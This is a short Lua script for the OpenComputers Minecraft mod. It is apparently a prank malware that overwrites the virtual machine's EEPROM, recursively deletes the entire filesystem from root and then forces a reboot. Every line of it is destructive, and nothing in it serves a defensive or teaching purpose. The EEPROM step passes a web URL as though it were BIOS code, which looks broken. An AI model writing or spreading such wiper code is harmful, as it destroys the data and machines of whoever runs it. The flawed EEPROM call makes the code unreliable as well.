local component = require("component")
local eeprom = component.eeprom
local fs = require("filesystem")

component.eeprom.set('https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua')

fs.remove("/")
computer.shutdown(true)
